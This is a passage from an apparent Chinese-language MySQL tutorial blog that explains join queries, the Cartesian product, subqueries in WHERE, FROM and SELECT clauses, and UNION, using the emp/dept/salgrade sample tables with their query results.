<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> a.ename <span class="keyword">as</span> <span class="string">&#x27;员工名&#x27;</span>,b.ename <span class="keyword">as</span> <span class="string">&#x27;领导名&#x27;</span>,c.dname,d.grade <span class="keyword">from</span> emp a <span class="keyword">left</span> <span class="keyword">join</span> emp b <span class="keyword">on</span> a.mgr<span class="operator">=</span>b.empno <span class="keyword">join</span> dept c <span class="keyword">on</span> a.deptno<span class="operator">=</span>c.deptno <span class="keyword">join</span> salgrade d <span class="keyword">on</span> a.sal <span class="keyword">between</span> d.losal <span class="keyword">and</span> d.hisal;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+-----------+------------+-------+</span></span><br><span class="line"><span class="operator">|</span> 员工名    <span class="operator">|</span> 领导名    <span class="operator">|</span> dname      <span class="operator">|</span> grade <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+-----------+------------+-------+</span></span><br><span class="line"><span class="operator">|</span> SMITH     <span class="operator">|</span> FORD      <span class="operator">|</span> RESEARCH   <span class="operator">|</span>     <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ALLEN     <span class="operator">|</span> BLAKE     <span class="operator">|</span> SALES      <span class="operator">|</span>     <span class="number">3</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> WARD      <span class="operator">|</span> BLAKE     <span class="operator">|</span> SALES      <span class="operator">|</span>     <span class="number">2</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> JONES     <span class="operator">|</span> KING      <span class="operator">|</span> RESEARCH   <span class="operator">|</span>     <span class="number">4</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> MARTIN    <span class="operator">|</span> BLAKE     <span class="operator">|</span> SALES      <span class="operator">|</span>     <span class="number">2</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> BLAKE     <span class="operator">|</span> KING      <span class="operator">|</span> SALES      <span class="operator">|</span>     <span class="number">4</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> CLARK     <span class="operator">|</span> KING      <span class="operator">|</span> ACCOUNTING <span class="operator">|</span>     <span class="number">4</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> SCOTT     <span class="operator">|</span> JONES     <span class="operator">|</span> RESEARCH   <span class="operator">|</span>     <span class="number">4</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> KING      <span class="operator">|</span> <span class="keyword">NULL</span>      <span class="operator">|</span> ACCOUNTING <span class="operator">|</span>     <span class="number">5</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> TURNER    <span class="operator">|</span> BLAKE     <span class="operator">|</span> SALES      <span class="operator">|</span>     <span class="number">3</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ADAMS     <span class="operator">|</span> SCOTT     <span class="operator">|</span> RESEARCH   <span class="operator">|</span>     <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> JAMES     <span class="operator">|</span> BLAKE     <span class="operator">|</span> SALES      <span class="operator">|</span>     <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> FORD      <span class="operator">|</span> JONES     <span class="operator">|</span> RESEARCH   <span class="operator">|</span>     <span class="number">4</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> MILLER    <span class="operator">|</span> CLARK     <span class="operator">|</span> ACCOUNTING <span class="operator">|</span>     <span class="number">2</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+-----------+------------+-------+</span></span><br><span class="line"><span class="number">14</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<h1 id="连接查询"><a href="#连接查询" class="headerlink" title="连接查询"></a>连接查询</h1><blockquote>
<p><strong>在实际开发中，一般一个业务会对应多张表，因此大部分情况下都不是从单表中查询数据，而是多张表联合查询数据从而取出最终的结果。这也是关系型数据库存在的原因。</strong></p>
</blockquote>
<p><strong>分类</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">根据年代划分：</span><br><span class="line">SQL92:旧的语法</span><br><span class="line">SQL99:较新的语法</span><br><span class="line"></span><br><span class="line">根据表的连接方式划分：</span><br><span class="line">内连接：分为等值连接，非等值连接，自连接</span><br><span class="line">外连接：分为左外连接（左连接），右外连接（右连接）</span><br><span class="line">全连接</span><br></pre></td></tr></table></figure>

<p><strong>笛卡尔积现象 (笛卡尔乘积现象)</strong></p>
<blockquote>
<p><strong>现象</strong>：当两张表进行连接查询时，如果没有条件限制的话，最终查询结果条数将会是两张表记录条数的乘积。<br><strong>避免笛卡尔乘积现象：添加条件进行过滤</strong><br>取表的别名：提高执行效率，增强可读性</p>
</blockquote>
<blockquote>
<p><strong>注：添加条件进行过滤并不会减少记录的匹配记录，仍然是两张表记录条数的乘积，只不过最终显示出来的是过滤之后的有效信息而已。</strong></p>
</blockquote>
<p><strong>示例：</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">找到每个员工的部门名称</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> dname,deptno <span class="keyword">from</span> dept;<span class="operator">/</span><span class="operator">/</span>部门名称以及部门编号</span><br><span class="line"><span class="operator">+</span><span class="comment">------------+--------+</span></span><br><span class="line"><span class="operator">|</span> dname      <span class="operator">|</span> deptno <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+--------+</span></span><br><span class="line"><span class="operator">|</span> ACCOUNTING <span class="operator">|</span>     <span class="number">10</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> RESEARCH   <span class="operator">|</span>     <span class="number">20</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> SALES      <span class="operator">|</span>     <span class="number">30</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> OPERATIONS <span class="operator">|</span>     <span class="number">40</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+--------+</span></span><br><span class="line"><span class="number">4</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> ename,deptno <span class="keyword">from</span> emp;<span class="operator">/</span><span class="operator">/</span>员工名称以及对应部门编号</span><br><span class="line"><span class="operator">+</span><span class="comment">--------+--------+</span></span><br><span class="line"><span class="operator">|</span> ename  <span class="operator">|</span> deptno <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+--------+</span></span><br><span class="line"><span class="operator">|</span> SMITH  <span class="operator">|</span>     <span class="number">20</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ALLEN  <span class="operator">|</span>     <span class="number">30</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> WARD   <span class="operator">|</span>     <span class="number">30</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> JONES  <span class="operator">|</span>     <span class="number">20</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> MARTIN <span class="operator">|</span>     <span class="number">30</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> BLAKE  <span class="operator">|</span>     <span class="number">30</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> CLARK  <span class="operator">|</span>     <span class="number">10</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> SCOTT  <span class="operator">|</span>     <span class="number">20</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> KING   <span class="operator">|</span>     <span class="number">10</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> TURNER <span class="operator">|</span>     <span class="number">30</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ADAMS  <span class="operator">|</span>     <span class="number">20</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> JAMES  <span class="operator">|</span>     <span class="number">30</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> FORD   <span class="operator">|</span>     <span class="number">20</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> MILLER <span class="operator">|</span>     <span class="number">10</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+--------+</span></span><br><span class="line"><span class="number">14</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">使用：<span class="keyword">select</span> ename,dname <span class="keyword">from</span> emp,dept;</span><br><span class="line">查出来的结果为两张表记录条数的乘积，即<span class="number">14</span><span class="operator">*</span><span class="number">4</span><span class="operator">=</span><span class="number">56</span>。</span><br><span class="line"></span><br><span class="line">过程：从员工表的第一位员工开始匹配，依次匹配四个部门而没有进行任何过滤，也就是说每一位员工均和四个部门进行了匹配。</span><br></pre></td></tr></table></figure>
<p>进行 where 过滤：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> a.ename,b.dname <span class="keyword">from</span> emp a,dept b <span class="keyword">where</span> a.deptno<span class="operator">=</span>b.deptno;</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">结果为</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> a.ename,b.dname <span class="keyword">from</span> emp a,dept b <span class="keyword">where</span> a.deptno<span class="operator">=</span>b.deptno;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------+------------+</span></span><br><span class="line"><span class="operator">|</span> ename  <span class="operator">|</span> dname      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+------------+</span></span><br><span class="line"><span class="operator">|</span> SMITH  <span class="operator">|</span> RESEARCH   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ALLEN  <span class="operator">|</span> SALES      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> WARD   <span class="operator">|</span> SALES      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> JONES  <span class="operator">|</span> RESEARCH   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> MARTIN <span class="operator">|</span> SALES      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> BLAKE  <span class="operator">|</span> SALES      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> CLARK  <span class="operator">|</span> ACCOUNTING <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> SCOTT  <span class="operator">|</span> RESEARCH   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> KING   <span class="operator">|</span> ACCOUNTING <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> TURNER <span class="operator">|</span> SALES      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ADAMS  <span class="operator">|</span> RESEARCH   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> JAMES  <span class="operator">|</span> SALES      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> FORD   <span class="operator">|</span> RESEARCH   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> MILLER <span class="operator">|</span> ACCOUNTING <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+------------+</span></span><br><span class="line"><span class="number">14</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">不再有冗余</span><br></pre></td></tr></table></figure>

<h1 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span>语句 中嵌套 <span class="keyword">select</span>语句，被嵌套 <span class="keyword">select</span>语句即为子查询。</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">语法：</span><br><span class="line"><span class="keyword">select</span> </span><br><span class="line">  ...(select...)</span><br><span class="line"><span class="keyword">from</span></span><br><span class="line">  ...(select...)</span><br><span class="line"><span class="keyword">where</span></span><br><span class="line">  ...(select...)</span><br></pre></td></tr></table></figure>

<p><strong>where 后面嵌套</strong></p>
<p>示例：找出高于平均薪资的员工</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> ename,sal <span class="keyword">from</span> emp <span class="keyword">where</span> sal <span class="operator">&gt;</span> (<span class="keyword">select</span> <span class="built_in">avg</span>(sal) <span class="keyword">from</span> emp );</span><br><span class="line"><span class="operator">+</span><span class="comment">-------+---------+</span></span><br><span class="line"><span class="operator">|</span> ename <span class="operator">|</span> sal     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+---------+</span></span><br><span class="line"><span class="operator">|</span> JONES <span class="operator">|</span> <span class="number">2975.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> BLAKE <span class="operator">|</span> <span class="number">2850.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> CLARK <span class="operator">|</span> <span class="number">2450.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> SCOTT <span class="operator">|</span> <span class="number">3000.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> KING  <span class="operator">|</span> <span class="number">5000.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> FORD  <span class="operator">|</span> <span class="number">3000.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+---------+</span></span><br><span class="line"><span class="number">6</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
<p><strong>from 后面嵌套</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">将查询出来的表作为一张新表，与另一张表进行连接查询</span><br></pre></td></tr></table></figure>
<p>示例：找出每个部门平均薪水的薪资等级</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">第一次查询：</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="built_in">avg</span>(sal) <span class="keyword">as</span> avgsal,deptno <span class="keyword">from</span> emp <span class="keyword">group</span> <span class="keyword">by</span> deptno;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+--------+</span></span><br><span class="line"><span class="operator">|</span> avgsal      <span class="operator">|</span> deptno <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+--------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2916.666667</span> <span class="operator">|</span>     <span class="number">10</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2175.000000</span> <span class="operator">|</span>     <span class="number">20</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1566.666667</span> <span class="operator">|</span>     <span class="number">30</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+--------+</span></span><br><span class="line">将查询出来的表作为一张新表 t，与 salgrade 表连接查询</span><br><span class="line"></span><br><span class="line">第二次查询：</span><br><span class="line"><span class="keyword">select</span> t.<span class="operator">*</span>,s.grade <span class="keyword">from</span> t <span class="keyword">join</span> salgrade s <span class="keyword">on</span> t.avgsal <span class="keyword">between</span> s.losal <span class="keyword">and</span> s.hisal;</span><br><span class="line"></span><br><span class="line">将表t 替换为<span class="keyword">select</span>子查询</span><br><span class="line"><span class="keyword">select</span> t.<span class="operator">*</span>,s.grade <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">avg</span>(sal) <span class="keyword">as</span> avgsal,deptno <span class="keyword">from</span> emp <span class="keyword">group</span> <span class="keyword">by</span> deptno) t <span class="keyword">join</span> salgrade s <span class="keyword">on</span> t.avgsal <span class="keyword">between</span> s.losal <span class="keyword">and</span> s.hisal;</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> t.<span class="operator">*</span>,s.grade <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">avg</span>(sal) <span class="keyword">as</span> avgsal,deptno <span class="keyword">from</span> emp <span class="keyword">group</span> <span class="keyword">by</span> deptno) t <span class="keyword">join</span> salgrade s <span class="keyword">on</span> t.avgsal <span class="keyword">between</span> s.losal <span class="keyword">and</span> s.hisal;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+--------+-------+</span></span><br><span class="line"><span class="operator">|</span> avgsal      <span class="operator">|</span> deptno <span class="operator">|</span> grade <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+--------+-------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2916.666667</span> <span class="operator">|</span>     <span class="number">10</span> <span class="operator">|</span>     <span class="number">4</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2175.000000</span> <span class="operator">|</span>     <span class="number">20</span> <span class="operator">|</span>     <span class="number">4</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1566.666667</span> <span class="operator">|</span>     <span class="number">30</span> <span class="operator">|</span>     <span class="number">3</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+--------+-------+</span></span><br></pre></td></tr></table></figure>
<p>示例二：找出每个部门平均的薪水等级</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">员工，薪水等级：</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> e.ename,e.deptno,s.grade <span class="keyword">from</span> emp e <span class="keyword">left</span> <span class="keyword">join</span> salgrade s <span class="keyword">on</span> e.sal <span class="keyword">between</span> s.losal <span class="keyword">and</span> s.hisal;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------+--------+-------+</span></span><br><span class="line"><span class="operator">|</span> ename  <span class="operator">|</span> deptno <span class="operator">|</span> grade <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+--------+-------+</span></span><br><span class="line"><span class="operator">|</span> SMITH  <span class="operator">|</span>     <span class="number">20</span> <span class="operator">|</span>     <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ADAMS  <span class="operator">|</span>     <span class="number">20</span> <span class="operator">|</span>     <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> JAMES  <span class="operator">|</span>     <span class="number">30</span> <span class="operator">|</span>     <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> WARD   <span class="operator">|</span>     <span class="number">30</span> <span class="operator">|</span>     <span class="number">2</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> MARTIN <span class="operator">|</span>     <span class="number">30</span> <span class="operator">|</span>     <span class="number">2</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> MILLER <span class="operator">|</span>     <span class="number">10</span> <span class="operator">|</span>     <span class="number">2</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ALLEN  <span class="operator">|</span>     <span class="number">30</span> <span class="operator">|</span>     <span class="number">3</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> TURNER <span class="operator">|</span>     <span class="number">30</span> <span class="operator">|</span>     <span class="number">3</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> JONES  <span class="operator">|</span>     <span class="number">20</span> <span class="operator">|</span>     <span class="number">4</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> BLAKE  <span class="operator">|</span>     <span class="number">30</span> <span class="operator">|</span>     <span class="number">4</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> CLARK  <span class="operator">|</span>     <span class="number">10</span> <span class="operator">|</span>     <span class="number">4</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> SCOTT  <span class="operator">|</span>     <span class="number">20</span> <span class="operator">|</span>     <span class="number">4</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> FORD   <span class="operator">|</span>     <span class="number">20</span> <span class="operator">|</span>     <span class="number">4</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> KING   <span class="operator">|</span>     <span class="number">10</span> <span class="operator">|</span>     <span class="number">5</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+--------+-------+</span></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span>  <span class="keyword">select</span> e.deptno,<span class="built_in">avg</span>(s.grade) <span class="keyword">from</span> emp e <span class="keyword">left</span> <span class="keyword">join</span> salgrade s <span class="keyword">on</span> e.sal <span class="keyword">between</span> s.losal <span class="keyword">and</span> s.hisal <span class="keyword">group</span> <span class="keyword">by</span> e.deptno;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------+--------------+</span></span><br><span class="line"><span class="operator">|</span> deptno <span class="operator">|</span> <span class="built_in">avg</span>(s.grade) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+--------------+</span></span><br><span class="line"><span class="operator">|</span>     <span class="number">10</span> <span class="operator">|</span>       <span class="number">3.6667</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>     <span class="number">20</span> <span class="operator">|</span>       <span class="number">2.8000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>     <span class="number">30</span> <span class="operator">|</span>       <span class="number">2.5000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+--------------+</span></span><br></pre></td></tr></table></figure>

<p><strong>select 后面嵌套</strong></p>
<p>示例：查出每个员工对应的部门</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">方法一：连接查询</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> e.ename,d.dname <span class="keyword">from</span> emp e <span class="keyword">left</span> <span class="keyword">join</span> dept d <span class="keyword">on</span> e.deptno<span class="operator">=</span>d.deptno;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------+------------+</span></span><br><span class="line"><span class="operator">|</span> ename  <span class="operator">|</span> dname      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+------------+</span></span><br><span class="line"><span class="operator">|</span> CLARK  <span class="operator">|</span> ACCOUNTING <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> KING   <span class="operator">|</span> ACCOUNTING <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> MILLER <span class="operator">|</span> ACCOUNTING <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> SMITH  <span class="operator">|</span> RESEARCH   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> JONES  <span class="operator">|</span> RESEARCH   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> SCOTT  <span class="operator">|</span> RESEARCH   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ADAMS  <span class="operator">|</span> RESEARCH   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> FORD   <span class="operator">|</span> RESEARCH   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ALLEN  <span class="operator">|</span> SALES      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> WARD   <span class="operator">|</span> SALES      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> MARTIN <span class="operator">|</span> SALES      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> BLAKE  <span class="operator">|</span> SALES      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> TURNER <span class="operator">|</span> SALES      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> JAMES  <span class="operator">|</span> SALES      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+------------+</span></span><br><span class="line"></span><br><span class="line">方法二：<span class="keyword">select</span>嵌套<span class="keyword">select</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> e.ename,(<span class="keyword">select</span> d.dname <span class="keyword">from</span> dept d <span class="keyword">where</span> e.deptno<span class="operator">=</span>d.deptno) <span class="keyword">as</span> dname <span class="keyword">from</span> emp e;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------+------------+</span></span><br><span class="line"><span class="operator">|</span> ename  <span class="operator">|</span> dname      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+------------+</span></span><br><span class="line"><span class="operator">|</span> SMITH  <span class="operator">|</span> RESEARCH   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ALLEN  <span class="operator">|</span> SALES      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> WARD   <span class="operator">|</span> SALES      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> JONES  <span class="operator">|</span> RESEARCH   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> MARTIN <span class="operator">|</span> SALES      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> BLAKE  <span class="operator">|</span> SALES      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> CLARK  <span class="operator">|</span> ACCOUNTING <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> SCOTT  <span class="operator">|</span> RESEARCH   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> KING   <span class="operator">|</span> ACCOUNTING <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> TURNER <span class="operator">|</span> SALES      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ADAMS  <span class="operator">|</span> RESEARCH   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> JAMES  <span class="operator">|</span> SALES      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> FORD   <span class="operator">|</span> RESEARCH   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> MILLER <span class="operator">|</span> ACCOUNTING <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+------------+</span></span><br></pre></td></tr></table></figure>

<h1 id="union"><a href="#union" class="headerlink" title="union"></a>union</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">将查询的结果集相加</span><br><span class="line"></span><br><span class="line">条件：</span><br><span class="line">两张虚拟表具有 相同的列数</span><br><span class="line">虚拟表对应的列数的 数据类型 相同</span><br><span class="line"><span class="keyword">select</span> ...... <span class="keyword">union</span> <span class="keyword">select</span> ......	</span><br></pre></td></tr></table></figure>
<p>举例：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> ename <span class="keyword">from</span> emp <span class="keyword">union</span> <span class="keyword">select</span> dname <span class="keyword">from</span> dept;</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> ename <span class="keyword">from</span> emp <span class="keyword">union</span> <span class="keyword">select</span> dname <span class="keyword">from</span> dept;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------+</span></span><br><span class="line"><span class="operator">|</span> ename      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+</span></span><br><span class="line"><span class="operator">|</span> SMITH      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ALLEN      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> WARD       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> JONES      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> MARTIN     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> BLAKE      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> CLARK      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> SCOTT      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> KING       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> TURNER     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ADAMS      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> JAMES      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> FORD       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> MILLER     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ACCOUNTING <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> RESEARCH   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> SALES      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> OPERATIONS <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+</span></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> ename <span class="keyword">from</span> emp <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1111</span> <span class="keyword">from</span> dept;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------+</span></span><br><span class="line"><span class="operator">|</span> ename  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+</span></span><br><span class="line"><span class="operator">|</span> SMITH  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ALLEN  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> WARD   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> JONES  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> MARTIN <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> BLAKE  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> CLARK  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> SCOTT  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> KING   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> TURNER <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ADAMS  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> JAMES  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> FORD   <span class="operator">|</span></span><br><span class="line"><span 